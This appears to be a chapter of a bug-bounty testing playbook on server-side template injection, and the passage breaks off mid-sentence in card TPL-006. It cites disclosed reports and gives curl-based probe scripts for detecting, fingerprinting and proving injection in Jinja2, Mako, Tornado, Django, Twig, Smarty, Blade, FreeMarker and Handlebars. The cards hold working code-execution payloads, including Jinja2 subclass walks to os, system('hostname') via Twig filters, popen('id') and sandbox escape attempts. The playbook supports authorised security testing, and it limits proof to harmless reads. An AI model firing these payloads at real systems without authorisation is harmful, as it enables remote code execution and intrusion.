# TPL · Server-side template injection

> Our input becomes part of a template's source instead of its data, and the template engine evaluates it on the
> server. It pays when the evaluation reaches the language runtime and one expression returns the server's host
> name or `id`, or reads the engine's configuration object. A computed `1337`, a template error, or `{{7*7}}`
> evaluated by AngularJS in the browser is a signal or another class, not this finding.

| | |
|---|---|
| **Class** | `ssti` |
| **Applies when** | http, app\|api |
| **Pays** | 21 disclosed reports filed under the class (12 more touch it), 6 paid, median $2,300, top $10,000. The two paid web reports claimed code execution: Flask/Jinja2 template injection on uber.com ($10,000) and path traversal, SSTI and RCE on a Mail.ru acquisition ($2,000). The other four paid are GitHub Security Lab query bounties. |
| **Weaknesses** | Code Injection · CWE-1336, CWE-917, CWE-94 |

## Why it pays

A developer who formats a greeting, a subject line or an error with `render_template_string("Hello " + name)`
instead of passing `name` as data has turned a text field into source code. Most engines are not sandboxes.
Jinja2, Mako, Tornado, ERB, EJS, Pug, FreeMarker, Velocity, Smarty and Razor all let an expression walk from a
template object to the runtime, and the disclosed reports that name an engine claim that reach in their titles:
Flask/Jinja2 (#125980, $10,000), Smarty (#164224), Twig file-system access (#301406), Handlebars in a Shopify
app's e-mail templates (#423541, per its linked write-up), Liquid "limited RCE" where Shopify accepts Liquid
(#98259, $1,500), Velocity in Apache Solr (#822002, a known CVE).

The input rarely arrives through a search box. It arrives through a field that a later job copies into a
template: a sign-up name (#1104349), a dashboard shared by e-mail (#904064), the e-mail field of a password-reset
form (#1265344), a CMS page (#399462). The other entry is a feature that hands users a template language on
purpose (e-mail and notification templates, themes, packing slips) and trusts a sandbox that does not hold.

Be honest about the library. Of the six paid reports, four are GitHub Security Lab CodeQL queries (Ruby SSTI
#1928279, SpEL #896298, OGNL #917455, Jakarta EL #1175842, $1,800 to $2,300 each), which say nothing about what a
web programme pays. Several of the unpaid ones are library advisories: lodash `_.template` (#904672,
informative), a Handlebars parser crash (#726364), a Velocity port in a CLI (#3897236). Client-side template
injection through AngularJS is filed and paid as XSS (#125027, $3,000; #217790, $1,000) and belongs to the XSS
chapter. OGNL and SpEL injection in Confluence, Struts and Spring Cloud by CVE number belongs to CVE-011 and
CVE-016.

The proof that suffices is small: arithmetic evaluated on the server, plus one harmless read. The read is the
host name (through a call that starts no process where the engine allows one), `id`, or the key names of the
engine's configuration object. Rate it as RCE: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8) without an account,
8.8 with a low-privilege one. Nothing more is needed and nothing more is allowed: no shell, no file beyond
`/etc/hostname`, no secret values, no template written to disk, no persistence.

## The crux question

**Is my input inserted into a template's source before the engine compiles it, or only into the data the template
renders, and once the engine evaluates it, what does its expression language let me reach?**

## Applicability probe

The chapter gate (`http`, `app|api`) comes from the fingerprint. The item gates come from the map walk: `reflect`
or `api` (TPL-001, TPL-002), `email-out` or `render` (TPL-003), `template-input` (TPL-004), the language tags
`python`, `php`, `java`, `ruby`, `node`, `dotnet` (TPL-005 to TPL-009), `params` (TPL-009, TPL-010) and the
capabilities `account` and `oob`.

```bash
# 1. Template syntax already shown to users: placeholders in settings pages, help text, bundles and saved responses
grep -rhoaE '\{\{ *[A-Za-z_][A-Za-z0-9_.]* *\}\}|\{%-? *(if|for|raw|include|block|assign)\b|\$\{ *[A-Za-z_][A-Za-z0-9_.]* *\}|<%= *[A-Za-z_]|\{\$[A-Za-z_][A-Za-z0-9_.]*\}|#\{ *[A-Za-z_]' \
  "$E/recon/$H/" 2>/dev/null | sort | uniq -c | sort -rn | head -30
# 2. Engine names and template errors in anything saved: error pages, bundles, headers, evidence
grep -rhoaiE '(jinja2?|twig|smarty|freemarker|velocity|thymeleaf|handlebars|mustache|liquid|nunjucks|pug|jade|ejs|erb|haml|slim|razor|mako|tornado|pebble|jinjava|hubl|scriban|text/template|TemplateSyntaxError|UndefinedError|Twig.Error|SmartyCompilerException|freemarker\.core|ParseErrorException|TemplateInputException|ActionView::Template::Error)[^"<]{0,40}' \
  "$E/recon/$H/" "$E/evidence/$H/" 2>/dev/null | sort | uniq -c | sort -rn | head -30
# 3. Reflection: sane fp sets reflect from common parameters; the XSS chapter's probe lists more in reflect.txt
wc -l "$E/recon/$H/reflect.txt" 2>/dev/null
```

Then walk the authenticated application once and note: settings that show `{{variable}}`-style placeholders
(e-mail, SMS and notification texts, invoice and packing-slip layouts, webhook payload templates, alert messages,
themes and page templates); every e-mail or PDF the application builds from a field we fill in (invitation,
share, notification, receipt, export, certificate); preview and "send test" buttons.

```bash
scripts/sane fact set "$H" template-input=1 --ev "Settings > E-mails: order-confirmation body editor with {{ customer.first_name }} placeholders; preview at POST /api/templates/preview"
scripts/sane fact set "$H" email-out=1 --ev "workspace invitation e-mail quotes the workspace name and the inviter's display name"
scripts/sane fact set "$H" render=1 --ev "invoice PDF printed from the billing name; Producer wkhtmltopdf 0.12.6"
scripts/sane fact set @eng oob=1 --ev "interactsh-client answers DNS and HTTP on the engagement's OOB host"
# nothing found after the walk:
scripts/sane fact set "$H" template-input=0 email-out=0 render=0 --ev "walked every settings page authenticated: no template editor, no placeholder syntax, no e-mail or PDF built from our fields"
```

With `reflect`, `api`, `template-input`, `email-out` and `render` all false, every item but the Java
expression-language and blind cards (TPL-009, TPL-010) closes as n/a; with `params` false as well, those close too,
and the planner writes the reason per item.

## Triage order

TPL-001 (one request per delimiter family on reflected values: the cheapest signal) → TPL-002 (name the engine on
any hit) → TPL-005, TPL-006, TPL-007 or TPL-008 (the read for that engine's language) → TPL-009 (Java: expression
fields and validation errors that echo the value) → TPL-003 (names, subjects and file names that reach e-mails and
PDFs; the sign-up name report #1104349 had this shape) → TPL-004 (template editors and their sandbox) → TPL-010
(blind, when no channel shows the output).

## Items

### TPL-001 · A value we send is evaluated by a server-side template engine before it is returned: one delimiter family's `191*7` comes back as `1337`

| | |
|---|---|
| **Severity** | None standalone: a computed `1337` proves evaluation, not impact; Critical with the host-name read of TPL-005 to TPL-008 through the same parameter; High when only the engine's configuration object is readable |
| **Requires** | reflect\|api |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Code Injection · CWE-1336 |
| **Prior art** | #125980, #399462, #299241 |

- **Where:** every value that comes back in a response: parameters in `$E/recon/$H/reflect.txt`, greeting,
  preview and "render" endpoints (`/preview`, `/render`, `/api/*/preview`), share pages that print a `title=` or
  `name=`, JSON APIs that echo a field into a message (`"Created project <name>"`), validation and error messages
  that quote the rejected value, 404 pages that print the path (a Flask 404 handler that formats the path into
  `render_template_string` is the textbook case), and values we store that our own next page shows back
  (profile, project and file names). Headers the page prints (`Referer`) count; the User-Agent counts only when
  the programme does not prescribe its own.
- **Test:** an engine compiles the string, so arithmetic written in its own delimiters comes back computed. Send
  one probe per delimiter family between two markers, with a plain value as the control: the family whose markers
  enclose `1337` evaluated it. Repeat that family with `191*8`: `1528` rules out a coincidence. A broken
  expression that turns the response into a template error names the engine even where nothing computes.
- **How:**
  ```bash
  D="$E/evidence/$H/TPL-001"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  U="$T/search"; P=q; S=()          # one endpoint and parameter from reflect.txt; S=($A) when it sits behind a login
  pr() {   # $1 = label, $2 = the expression sent between the two markers
    curl -sS "${HDR[@]}" "${S[@]}" --get --data-urlencode "$P=tpl001a$2tpl001b" "$U" -o "$D/$1.body" \
      -w "$1\t%{http_code}\t%{size_download}\n"; sleep "$W"; }
  { pr base 'x'
    pr curly '{{191*7}}'; pr dollar '${191*7}'; pr erb '<%= 191*7 %>'; pr hash '#{191*7}'
    pr brace '{191*7}'; pr razor '@(191*7)'; pr velocity '#set($t=191*7)${t}'; pr liquid '{{191|times:7}}'
    pr go '{{printf "%x" 4919}}'; pr jinja-stmt '{% print(191*7) %}'
    pr poly '${{<%[%'"'"'"}}%\.'; } | tee "$D/probes.tsv"
  grep -l 'tpl001a1337tpl001b' "$D"/*.body                       # the family that computed
  pr again '{{191*8}}'; grep -c 'tpl001a1528tpl001b' "$D/again.body"   # that family's probe with 191*8 in place of 191*7
  grep -aohiE '(jinja2?|twig|smarty|freemarker|velocity|thymeleaf|handlebars|mustache|liquid|nunjucks|pug|ejs|erb|razor|mako|tornado|pebble|jinjava|template|parse error|syntax ?error)[^<"]{0,80}' \
    "$D/poly.body" | sort -u | head
  ```
  `{{printf "%x" 4919}}` prints `1337` only in Go templates, which have no arithmetic operators. A WAF that blocks
  `{{` often passes `{% print(191*7) %}` (Jinja2). For a form body drop `--get`; for JSON put `-H 'Content-Type:
  application/json' -d "$(jq -nc --arg v "tpl001a$2tpl001b" '{name:$v}')"` in `pr`; for a path segment request
  `"$T/x/tpl001a$(printf %s "$2" | jq -sRr @uri)tpl001b"`; for a header use `-H "Referer: tpl001a$2tpl001b"`.
- **Proof:** `tpl001a1337tpl001b` in the raw response for one family, `tpl001a1528tpl001b` for `191*8`, and the
  base and the other families returned as typed, with request and response saved raw. This is a candidate; the
  finding is this plus TPL-002's engine and the language card's read.
- **Not a finding when:** the raw `curl` body holds the literal `{{191*7}}` and only the browser shows `1337`:
  AngularJS or Vue evaluated it client side, which is XSS (XSS-001's AngularJS row), not this card. The value
  returns as typed, encoded or with the braces stripped. A 500 on the polyglot alone, without an engine's name
  or parser message: many back ends fail on `%`, quotes or braces (JSON parsers, SQL, the WAF). `{{191*7}}`
  becomes an empty string: a logic-less engine (Mustache) looked up a variable of that name, which TPL-002 sorts
  out. A calculator, spreadsheet or rule field computes `191*7` without any delimiters: that is an expression
  feature (RCE-007, or TPL-009 on Java).
- **Escalate:** TPL-002 names the engine; then TPL-005 (Python), TPL-006 (PHP), TPL-007 (Java) or TPL-008 (Ruby,
  Node, .NET). With HTML escaping off, the same parameter is also reflected XSS: report the template injection,
  the higher severity, once.

### TPL-002 · Two distinguishing probes and the error text name the template engine that evaluated our expression

| | |
|---|---|
| **Severity** | None standalone: it names the engine and selects the proof card; Medium for the Go branch when `{{printf "%+v" .}}` returns fields the page never shows, since no Go card exists |
| **Requires** | reflect\|api\|email-out\|render\|template-input |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Code Injection · CWE-1336 |
| **Prior art** | #125980, #164224, #301406, #423541 |

- **Where:** the evaluation point that TPL-001 (a reflected value), TPL-003 (a stored field and the job that
  renders it) or TPL-004 (a template editor's preview) found, with the delimiter family that computed. Read the
  language tag (`python`, `php`, `java`, `ruby`, `node`, `dotnet`) from the fingerprint first: several engines
  share a syntax and differ only by language.
- **Test:** engines that share delimiters disagree on a few expressions: `7*"7"` is `7777777` in Python and `49`
  in PHP and JavaScript, `"t"*3` is `ttt` in Python, Ruby and Groovy and `NaN` in JavaScript, and each engine has
  an object only it defines (`self`, `_self`, `.version`, `$smarty`). Run the line for the family that computed and
  read the result against the table, together with any error text.
- **How:**
  ```bash
  D="$E/evidence/$H/TPL-002"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  U="$T/search"; P=q; S=()          # the evaluation point; for a stored field, store each probe and re-run its job
  pr() { curl -sS "${HDR[@]}" "${S[@]}" --get --data-urlencode "$P=tpl002a$2tpl002b" "$U" -o "$D/$1.body"; sleep "$W"
         printf '%-9s %s\n' "$1" "$(grep -aoE 'tpl002a.{0,160}tpl002b' "$D/$1.body" | head -1)"; }
  # {{ }} computed
  pr mul '{{7*"7"}}'; pr self '{{self}}'; pr tself '{{_self}}'; pr squeeze '{{squeeze("a  b")}}'; pr upper '{{"a".toUpperCase()}}'
  pr liquid '{{191|times:7}}'; pr django '{{191|add:1146}}'; pr this '{{this}}'; pr scriban '{{"a"|string.upcase}}'; pr go '{{printf "%x" 4919}}'
  # ${ } computed
  pr fmver '${.version}'; pr strmul '${"t"*3}'; pr thin '[[${191*7}]]'; pr thpre '__${191*7}__'
  # <%= %>, #{ }, { }, @( ), #set computed
  pr erbstr '<%= "t"*3 %>'; pr esdelim '${191*7}'; pr hashstr '#{"t"*3}'; pr smver '{$smarty.version}'
  pr razor '@(191*7)'; pr vm '#set($t=191*7)${t}'
  # Go branch only: the type and the fields of the object the template receives
  pr gotype '{{printf "%T" .}}'; pr gofields '{{printf "%+v" .}}'
  ```
  ```text
  family   probe → output                                  engine (language)                       proof card
  {{ }}    {{7*"7"}} → 7777777                             Jinja2 or Tornado (Python)
             {{self}} → <TemplateReference None>             Jinja2                                  TPL-005
             {{squeeze("a  b")}} → a b                       Tornado                                 TPL-005
           {{7*"7"}} → 49 (or an error)                    Twig (php), Nunjucks (node), Pebble or JinJava (java)
             {{_self}} → a template name                     Twig                                    TPL-006
             {{"a".toUpperCase()}} → A                       Nunjucks (node); Pebble, JinJava (java) TPL-008; TPL-007
           {{"a"|string.upcase}} → A                       Scriban (.NET)                          TPL-008
           {{191|add:1146}} → 1337, {{191*7}} an error      Django (Python, no code execution)      TPL-005, settings branch
           {{191|times:7}} → 1337                          Liquid (any language, sandboxed)        TPL-004
           {{this}} → [object Object], {{191*7}} "Parse error ... Expecting 'ID', 'STRING', 'NUMBER'"
                                                             Handlebars (node)                       TPL-008
           {{191*7}} → empty                               Mustache (logic-less)                   park
           {{printf "%x" 4919}} → 1337                     Go text/template or html/template      this card, Go branch
  ${ }     ${.version} → 2.3.x                             FreeMarker (Java)                       TPL-007
           ${"t"*3} → ttt                                  Mako (Python) or Groovy (Java)          TPL-005; TPL-007
           ${"t"*3} → NaN                                  lodash or underscore _.template (Node)  TPL-008
           ${"t"*3} → error, ${.version} → error           JSP or Jakarta EL (Java)                TPL-009
           only [[${191*7}]] or __${191*7}__ → 1337        Thymeleaf with SpEL (Java)              TPL-007
  <%= %>   <%= "t"*3 %> → ttt                              ERB, Erubi (Ruby)                       TPL-008
           <%= "t"*3 %> → NaN, ${191*7} as typed           EJS (Node)                              TPL-008
           <%= "t"*3 %> → NaN, ${191*7} → 1337             lodash or underscore _.template (Node)  TPL-008
  #{ }     #{"t"*3} → ttt                                  Slim, Haml (Ruby)                       TPL-008
           #{"t"*3} → NaN                                  Pug (Node)                              TPL-008
           #{191*7} → ??191*7_en_US??                       Thymeleaf message lookup: not evaluation, try [[${ }]]
  { }      {$smarty.version} → 3.x, 4.x or 5.x             Smarty (PHP)                            TPL-006
  @( )     @(191*7) → 1337                                 Razor (.NET)                            TPL-008
  #set     #set($t=191*7)${t} → 1337                       Velocity (java); velocityjs (node)      TPL-007; TPL-008
  ```
  Go branch: no Go fact or card exists, so the read happens here. `%T` names the type (`main.Page`,
  `*gin.Context`, `*echo.context`) and `%+v` prints its field names and values. A template calls only the
  exported methods of that object, `{{.Method}}` without arguments: read the type's documentation for one that
  reads, never one that writes, and call it once.
- **Proof:** two probe outputs that match one row of the table, the error text where there is one, and the
  language tag, saved raw. For the Go branch: the type name and the field names, with any secret values cut to
  four characters.
- **Not a finding when:** the outputs match rows of two engines: the value passed through two layers (a Liquid
  theme around a Markdown renderer, a server template whose output a client framework compiles again); read the
  error text and test the raw `curl` body only. Braces or `$` stripped by a WAF or a sanitiser make a family look
  inert. An engine name in an error page with nothing evaluated is `version-disclosure`. The Go branch prints only
  what the page already shows: nothing beyond the template's own data.
- **Escalate:** the proof card in the table. Mustache and Handlebars 4.6 and later: park unless TPL-004's context
  listing shows data the page does not. Liquid: TPL-004. JSP or Jakarta EL and SpEL outside a template: TPL-009.
  No output at all in any channel: TPL-010.

### TPL-003 · A name, subject or file name we store is evaluated when the server builds an e-mail, a notification or a PDF from it: the message shows `1337` where we wrote `191*7`

| | |
|---|---|
| **Severity** | None standalone: evaluation in the message or document is the signal; Critical with the host-name read of TPL-005 to TPL-008 through the same field; High when only the engine's configuration object is readable |
| **Requires** | email-out\|render, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Code Injection · CWE-1336 |
| **Prior art** | #1104349, #904064, #1265344 |

- **Where:** fields that a later job copies into a message or document template. Names: display, first and last
  name, set at sign-up (#1104349 was the name parameter during sign-up) or in the profile. Workspace,
  organisation, project and team names quoted in invitations. Ticket and message subjects in notification
  e-mails. Uploaded file names in "shared a file with you" messages. Address, company and VAT fields on invoices,
  receipts and certificates. Titles of dashboards and reports sent by e-mail (#904064 was a shared dashboard)
  and of scheduled exports. The e-mail field of a password-reset form (#1265344). The developer formats a subject
  or a greeting with the value before rendering, so the field is evaluated even where the page shows it escaped.
- **Test:** store one value that carries a probe of every likely family between markers, trigger the job, and read
  the delivered message or document. Jinja2, Tornado, Twig, ERB, EJS and lodash leave the other families' syntax
  as text, so one save answers for them (lodash computes two positions, `${}` and `<%= %>`). Mako reads `<%` as a
  code block, and Handlebars, Smarty and Go reject `{{191*7}}`: if the message fails, arrives without the field,
  or the save is refused, repeat with one family per save, starting with the families the language tag allows.
- **How:**
  ```bash
  D="$E/evidence/$H/TPL-003"; mkdir -p "$D"; : "${MB:?an inbox of ours that receives the message (A's own address, or a second address of ours for invitations)}"
  V='t3a{{191*7}}b${191*7}c<%=191*7%>d#{191*7}e{191*7}f@(191*7)z'      # 59 characters; drop families the language rules out
  # 1. store it where a message or document picks it up (example: A's display name), and check it is kept as typed
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/me" -H 'Content-Type: application/json' \
    -d "$(jq -nc --arg v "$V" '{name:$v}')" -o "$D/1-store.body" -w '%{http_code}\n'
  curl -sS "${HDR[@]}" $A "$T/api/me" | grep -aqF "$V" && echo stored-as-typed
  # 2. start the job that uses it (examples: an invitation to MB, the PDF of the latest invoice)
  curl -sS "${HDR[@]}" $A -X POST "$T/api/invitations" -H 'Content-Type: application/json' \
    -d "$(jq -nc --arg e "$MB" '{email:$e}')" -o "$D/2-trigger.body" -w '%{http_code}\n'
  curl -sS "${HDR[@]}" $A "$T/api/invoices/latest/pdf" -o "$D/3-doc.pdf" -w '%{http_code}\n'
  # 3. read the result: the raw message saved from MB's mailbox ("show original") as $D/mail.eml, and the PDF text
  python3 - "$D/mail.eml" <<'PY' | grep -aoE 't3a.{0,90}z'
  import sys
  from email import policy
  from email.parser import BytesParser
  m = BytesParser(policy=policy.default).parse(open(sys.argv[1], 'rb'))
  print(m['subject'])
  for part in m.walk():
      if part.get_content_maintype() == 'text':
          print(part.get_content())
  PY
  pdftotext "$D/3-doc.pdf" - | grep -aoE 't3a.{0,90}z'
  ```
  The parser decodes quoted-printable bodies and encoded subjects; grepping the raw `.eml` misses markers split
  by soft line breaks and `=` written as `=3D`. Read the subject line too: it is often the only templated part.
  A second save with `191*8` must give `1528` in the next message.
- **Proof:** the stored value as typed (from the profile API), the request that started the job, and the raw
  message or PDF showing `1337` at one family's position and the other families as typed; then `1528` from the
  second save. This is a candidate; the finding is this plus TPL-002's engine and the language card's read
  through the same field and job.
- **Not a finding when:** the message shows the value exactly as typed, escaped or not. The e-mail was built by
  the mail vendor's own template engine (SendGrid dynamic templates, Mailchimp merge tags, Postmark): the
  evaluation ran on the vendor's systems (`third-party`). The PDF was made in the browser (jsPDF, print to PDF),
  not on the server. A value that breaks the template, so the e-mail fails or the page errors, without a computed
  result: record which family broke it and continue; reported alone it closes as self-DoS (#1265344, informative,
  `dos`). A number computed in a CSV or spreadsheet export opened in a spreadsheet program is `csv-injection`.
- **Escalate:** TPL-002 with one family per save, then the language card's payloads through the same field and
  job. The field's length limit decides which payload fits: the Jinja2 host-name expression of TPL-005 is 51
  characters, and a 40-character name field takes one family per save at most. An HTML template rendered to PDF
  also loads markup: SSR-007.

### TPL-004 · The template feature we are allowed to edit reaches past its documented variables: an undocumented object returns server configuration, another tenant's data or the host name

| | |
|---|---|
| **Severity** | Medium standalone when the editor returns configuration or data that the documentation does not expose; High when it reads another tenant's records; Critical when it reaches the runtime and returns the host name; none for the documented variables, filters and arithmetic |
| **Requires** | template-input, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Code Injection · CWE-1336 |
| **Prior art** | #423541, #98259, #2332551 |

- **Where:** features that give users a template language by design: e-mail, SMS and notification templates
  (#423541 was the e-mail templates of a Shopify app), invoice, receipt and packing-slip layouts, CMS themes and
  page templates (HubL, Liquid, Twig), report and dashboard layouts, webhook payload templates, alert and incident
  message templates (Go templates in Grafana and Alertmanager style products), job and deployment templates in an
  admin or management console (#2332551 was template injection reachable from a management console editor role).
  Find the preview, "send test" or "render" request: it is the fastest channel. Save the documented variable
  list (help page or editor sidebar) to `$D/documented.txt` first.
- **Test:** the feature works when documented variables, filters and arithmetic work, so those prove nothing. Name
  the engine with TPL-002's probes inside the editor, list what the template context really holds, and compare it
  with the documentation. Then try the first construct outside the documented vocabulary for that engine: the
  sandbox either refuses it with its own error, or it returns something the documentation does not promise.
- **How:**
  ```bash
  D="$E/evidence/$H/TPL-004"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  U="$T/api/templates/preview"; F=body          # the editor's preview or test-send request, from the map
  tp() { curl -sS "${HDR[@]}" $A -X POST "$U" -H 'Content-Type: application/json' \
           -d "$(jq -nc --arg k "$F" --arg v "tpl004a$2tpl004b" '{($k):$v}')" -o "$D/$1.body"; sleep "$W"
         printf '%-9s %s\n' "$1" "$(grep -aoE 'tpl004a.{0,300}tpl004b' "$D/$1.body" | head -1)"; }
  # 1. the engine (TPL-002's distinguishing probes), with one documented variable as the control
  tp doc '{{customer.first_name}}'; tp mul '{{7*"7"}}'; tp liquid '{{191|times:7}}'; tp this '{{this}}'; tp go '{{printf "%T" .}}'
  # 2. what the context holds beyond the documented variables, by engine
  tp hb-keys '{{#each this}}{{@key}},{{/each}}'                    # Handlebars
  tp tw-keys '{{_context|keys|join(",")}}'                         # Twig
  tp j2-keys '{{self._TemplateReference__context.keys()|list}}'    # Jinja2 (SecurityError under the sandbox)
  tp fm-keys '${.data_model?keys?join(",")}'                       # FreeMarker
  tp go-dump '{{printf "%+v" .}}'                                  # Go
  # 3. the sandbox's edge: the first construct outside the vocabulary
  tp j2-esc '{{cycler.__init__.__globals__.os.uname().nodename}}'  # Jinja2: "access to attribute ... is unsafe" = sandbox holds
  tp tw-esc '{{["hostname"]|filter("system")|join}}'               # Twig: "must be a Closure in sandbox mode" or "not allowed" = holds
  tp hb-esc '{{lookup (lookup this "constructor") "name"}}'        # Handlebars: "Object" = prototype access open (old releases)
  tp fm-esc '${"freemarker.template.utility.Execute"?new()("hostname")}'  # FreeMarker: "not allowed ... for security reasons" = holds
  ```
  Liquid has no generic escape and no introspection: read the product's custom tags, filters and objects
  (`{% include %}`, `{% render %}`, lookups by handle or id) for one that reaches files, other shops or tenants,
  or outbound requests (#98259 paid $1,500 for a "limited RCE" where Liquid is accepted). A lookup by id
  (`{{ orders[48213] }}`, `{% assign o = order_by_id 48213 %}`) aimed at an object of our second account B is the
  cross-tenant test, never at a real customer's id.
- **Proof:** `$D/documented.txt` next to output that goes beyond it: context keys or objects the documentation
  does not list (their names, values of secrets cut to four characters), B's record rendered in A's template, or
  the host name through the language card's payload in the same editor. The engine's own refusal message, where
  one construct is refused and another is not, shows exactly where the sandbox ends.
- **Not a finding when:** only documented variables, loops, filters and arithmetic work: Liquid, Handlebars,
  HubL and sandboxed Jinja2 and Twig are designed for this. The role that edits the template already runs code
  by design (an administrator's theme editor that saves PHP, a script console): the RCE chapter's "code execution
  by the role that owns it". The preview renders in the browser (no request to the server when clicking preview,
  or the response holds the template unrendered): client side, XSS or nothing. The template is rendered by an
  e-mail or document vendor (`third-party`). The context key list holds only what the documentation lists under
  other names.
- **Escalate:** the language card for the runtime read: TPL-005, TPL-006, TPL-007 or TPL-008. A lower role that
  may edit templates (#417839 and #423198 paid $500 each for packing-slip template editing by low-privileged
  staff) makes any escape privilege escalation: BAC-011 and RCE-012. An HTML template rendered to PDF loads
  internal URLs: SSR-007 (#1115139 was a packing-slip template's HTML filter bypassed to reach internal
  Kubernetes endpoints).

### TPL-005 · A Jinja2, Mako or Tornado expression we control reaches the Python runtime and returns the server's host name, or Django's template reaches the secret key

| | |
|---|---|
| **Severity** | Critical standalone when the expression returns the host name through `os` or `socket`; High when only Flask's `config` or Django's secret key is reachable (key names, or length and first four characters, shown); none when the sandbox refuses every attribute that starts with an underscore |
| **Requires** | python, reflect\|api\|email-out\|render\|template-input |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Code Injection · CWE-1336 |
| **Prior art** | #125980, #944359 |

- **Where:** the evaluation point where TPL-002 named Jinja2, Tornado, Mako or Django: a reflected parameter
  (TPL-001), a stored field and its job (TPL-003), a template editor (TPL-004). Flask apps that build a page
  with `render_template_string` from a value are the common case (#125980 was Flask/Jinja2).
- **Test:** template globals carry the globals of the module that defined them, and those import `os`: Jinja2's
  `cycler` and `lipsum` reach `os.uname()`, which returns the host name without starting a process. Mako and
  Tornado evaluate plain Python, so `import` works. Django templates call no functions with arguments: their
  reach is attributes of context objects, and the messages framework's cookie signer holds `SECRET_KEY`.
- **How:**
  ```bash
  D="$E/evidence/$H/TPL-005"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  U="$T/search"; P=q; S=()          # the evaluation point; for a stored field, store each payload and re-run its job
  pr() { curl -sS "${HDR[@]}" "${S[@]}" --get --data-urlencode "$P=tpl005a$2tpl005b" "$U" -o "$D/$1.body"; sleep "$W"
         printf '%-9s %s\n' "$1" "$(grep -aoE 'tpl005a.{0,300}tpl005b' "$D/$1.body" | head -1)"; }
  # Jinja2 (Flask, plain Jinja2): os through template globals, no process
  pr j2-host  '{{cycler.__init__.__globals__.os.uname().nodename}}'
  pr j2-host2 '{{lipsum.__globals__.os.uname().nodename}}'
  pr j2-walk  "{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__=='_wrap_close' %}{{c.__init__.__globals__['uname']().nodename}}{% endif %}{% endfor %}"
  pr j2-cfg   '{{config.keys()|list}}'                  # Flask only: the key names, never the values
  # Mako and Tornado: plain Python
  pr mk-host  '${__import__("socket").gethostname()}'
  pr tn-host  '{% import socket %}{{socket.gethostname()}}'
  # Django: no function calls; the signer key of the messages framework, as length and first four characters
  pr dj-key   '{{messages.storages.0.signer.key|length}} {{messages.storages.0.signer.key|slice:":4"}}'
  ```
  Under autoescape the output is HTML-encoded (`&#39;` for quotes in the config key list); decode before quoting
  it. If the programme asks for the user as well, one more request with `{{lipsum.__globals__.os.popen('id').read()}}`,
  then stop.
- **Proof:** the host name between the markers, next to TPL-001's computed `1337` from the same point, with request
  and response saved raw. For Flask's config: the list of key names (`SECRET_KEY` among them) and no value. For
  Django: the key's length and first four characters, with a sentence that the full value is readable the same way.
- **Not a finding when:** every payload raises `SecurityError: access to attribute '__init__' of 'type' object is
  unsafe` or the same for `__globals__`, `__class__` or `_TemplateReference__context`: a `SandboxedEnvironment`
  holds, and arithmetic inside it is the feature (TPL-004's Not-a-finding). The markers enclose the payload text:
  nothing was evaluated. `messages` is undefined: the context has no messages framework, so Django's reach is the
  context only. The host name belongs to a notebook, preview or sandbox service the product sells for running
  code.
- **Escalate:** stop at the host name and the key names. Never print `config.SECRET_KEY`, `os.environ` or database
  URLs, and never use a secret to sign anything. The report says what the same expression could read (secret key,
  environment, files) without reading it.

### TPL-006 · A Twig, Smarty or Blade expression we control calls a PHP function and the server's host name comes back

| | |
|---|---|
| **Severity** | Critical standalone when a PHP function call returns the host name; none when the Twig sandbox or the Smarty security policy refuses every function and only the version prints |
| **Requires** | php, reflect\|api\|email-out\|render\|template-input |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Code Injection · CWE-1336 |
| **Prior art** | #164224, #301406 |

- **Where:** the evaluation point where TPL-002 named Twig (`{{7*"7"}}` gives 49 and `{{_self}}` a template
  name), Smarty (`{$smarty.version}` prints) or Blade (`{{PHP_VERSION}}` prints the PHP version, since Blade
  compiles `{{ }}` to a PHP `echo`). #164224 was Smarty, #301406 Twig.
- **Test:** Twig 1.41, 2.10 and 3.x hand a callable name to the `filter`, `map`, `sort` and `reduce` filters
  outside sandbox mode, so a PHP function name runs with our value as its argument. Twig 1.x also exposes the
  environment through `_self`. Smarty 3 and 4 without a security policy call PHP functions in tags. Blade
  `{{ }}` is a PHP expression.
- **How:**
  ```bash
  D="$E/evidence/$H/TPL-006"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  U="$T/search"; P=q; S=()
  pr() { curl -sS "${HDR[@]}" "${S[@]}" --get --data-urlencode "$P=tpl006a$2tpl006b" "$U" -o "$D/$1.body"; sleep "$W"
         printf '%-9s %s\n' "$1" "$(grep -aoE 'tpl006a.{0,300}tpl006b' "$D/$1.body" | head -1)"; }
  # Twig: the version (no code), then system() through a callable-taking filter (one hostname process)
  pr tw-ver  '{{constant("Twig\\Environment::VERSION")}}'; pr tw-ver1 '{{constant("Twig_Environment::VERSION")}}'
  pr tw-host '{{["hostname"]|filter("system")|join}}'
  pr tw1-host '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("hostname")}}'   # Twig 1.x
  # Smarty: the version, then a PHP function in a tag
  pr sm-ver  '{$smarty.version}'; pr sm-host "{system('hostname')}"
  # Blade (Blade::render of our text): a PHP expression, no process
  pr bl-host '{{ php_uname("n") }}'
  ```
  `system` prints the command's output into the rendered template, followed by the array element (`hostname`)
  that `join` prints. `php_uname` cannot go through Twig's filters: they pass the array key as a second argument,
  and PHP 8 rejects `php_uname()` with two (`ArgumentCountError`). If the programme asks for the user, one more
  request with `"id"` in place of `"hostname"`, then stop.
- **Proof:** the host name between the markers, the engine's version from the same point, and TPL-001's `1337`,
  with request and response saved raw.
- **Not a finding when:** Twig answers `The callable passed to "filter" filter must be a Closure in sandbox mode`
  or `Filter "filter" is not allowed`, or Smarty answers that the PHP function is not allowed by its security
  setting: the sandbox or the policy holds, and the version alone is `version-disclosure`. Smarty 5 rejects PHP
